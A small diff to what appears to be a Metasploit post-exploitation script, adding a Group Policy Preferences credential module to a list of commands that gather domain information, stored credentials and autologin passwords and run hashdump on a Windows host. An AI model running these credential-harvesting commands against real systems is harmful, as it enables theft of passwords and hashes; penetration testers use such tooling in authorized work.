@@ -399,6 +399,7 @@ run post/windows/gather/enum_domain
 run post/windows/gather/enum_domains
 run post/windows/gather/enum_unattend
 run post/windows/gather/credentials/enum_cred_store
+run post/windows/gather/credentials/gpp
 run post/windows/gather/credentials/windows_autologin
 hashdump
 use priv
